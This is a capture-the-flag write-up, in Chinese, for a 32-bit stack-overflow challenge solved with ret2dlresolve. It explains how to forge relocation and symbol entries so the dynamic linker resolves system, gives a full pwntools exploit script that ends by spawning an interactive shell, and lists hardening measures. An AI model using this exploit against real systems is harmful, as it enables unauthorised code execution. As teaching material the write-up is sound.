# ROP_LEVEL5

## 题目简述

这是一个 32 位、动态链接且没有可直接利用 `system` 符号的栈溢出题。程序能通过 `read@plt` 向 `.bss` 写入数据，因此可伪造 `Elf32_Rel`、`Elf32_Sym` 和字符串表项，再跳入 PLT0 让动态链接器把伪造符号解析为 `system`。核心方法是 ret2dlresolve。

## 解题过程

溢出到返回地址前需要填充 `0x44` 字节，并越过保存的 EBP：

```python
padding = b"A" * 0x44 + b"BBBB"
```

利用中使用的 ROP 小工具与写入地址为：

```python
pop1ret = 0x080485DB
pop3ret = 0x080485D9
stage = elf.bss()
```

动态解析需要先理解四个地址：

```python
plt0 = elf.get_section_by_name(".plt").header.sh_addr
rel_plt = elf.get_section_by_name(".rel.plt").header.sh_addr
dynsym = elf.get_section_by_name(".dynsym").header.sh_addr
dynstr = elf.get_section_by_name(".dynstr").header.sh_addr
```

链接器从传给 PLT0 的偏移定位重定位项：

$$
reloc\_arg=fake\_rel-rel\_plt.
$$

伪造 `Elf32_Rel` 的 `r_offset` 指向一块可写地址，`r_info` 的高 24 位是伪造符号索引，低 8 位使用 `R_386_JMP_SLOT=7`：

$$
sym\_index=\frac{fake\_sym-dynsym}{16},
$$

$$
r\_info=(sym\_index\ll8)\mathbin{|}7.
$$

`Elf32_Sym` 大小为 16 字节，所以 `fake_sym` 必须相对 `.dynsym` 对齐。其 `st_name` 写成 `"system\0"` 在伪造字符串区内相对 `.dynstr` 的偏移，`st_info` 取 `0x12`。构造过程如下：

```python
from pwn import *

elf = ELF("./ROP_LEVEL5")

stage = elf.bss()
plt0 = elf.get_section_by_name(".plt").header.sh_addr
rel_plt = elf.get_section_by_name(".rel.plt").header.sh_addr
dynsym = elf.get_section_by_name(".dynsym").header.sh_addr
dynstr = elf.get_section_by_name(".dynstr").header.sh_addr

fake_rel = stage
fake_sym = fake_rel + 8
fake_sym += (16 - (fake_sym - dynsym) % 16) % 16
fake_str = fake_sym + 16

sym_index = (fake_sym - dynsym) // 16
r_info = (sym_index << 8) | 7
st_name = fake_str - dynstr

blob = p32(stage + 0x200) + p32(r_info)
blob = blob.ljust(fake_sym - stage, b"\x00")
blob += p32(st_name)          # st_name
blob += p32(0)                # st_value
blob += p32(0)                # st_size
blob += p8(0x12)              # st_info
blob += p8(0)                 # st_other
blob += p16(0)                # st_shndx
blob += b"system\x00"

# 解析器还会查询 .gnu.version[sym_index]。选址时需要保证对应字节
# 可读且版本索引为 0；若不是 0，就继续给 fake_sym 增加 16 字节对齐。
reloc_arg = fake_rel - rel_plt
```

第一阶段 ROP 调用 `read(0, stage, len(stage2))`，`pop3ret` 清理三个参数，然后进入 PLT0。解析完成后，链接器会像普通函数调用一样把下一项作为返回地址、再下一项作为 `system` 的第一个参数：

```python
command = b"$0 1>&0\x00"
command_addr = stage + len(blob)
stage2 = blob + command

payload = padding + flat(
    elf.plt["read"],
    pop3ret,
    0,
    stage,
    len(stage2),
    plt0,
    reloc_arg,
    pop1ret,
    command_addr,
)

io.send(payload)
io.send(stage2)
io.interactive()
```

`$0` 在 shell 中展开为当前 shell 的名字，`1>&0` 把标准输出重定向到仍与远端连接相通的文件描述符 0；因此 `system("$0 1>&0")` 可以得到交互 shell。若复现环境的装载布局与官方附件不同，应重新计算所有节地址，不能照搬上面的固定 gadget。

## 方法总结

- ret2dlresolve 的本质是伪造链接器本来会读取的重定位项、符号项和符号名，而不是凭空调用一个不存在的 PLT 项。
- 最容易出错的是 `Elf32_Sym` 的 16 字节对齐、相对地址计算、`r_info` 编码以及 `.gnu.version` 对应索引。
- 防护侧应启用完整 RELRO、栈保护、PIE 和不可执行栈，并从根源修复无界读入导致的栈溢出。
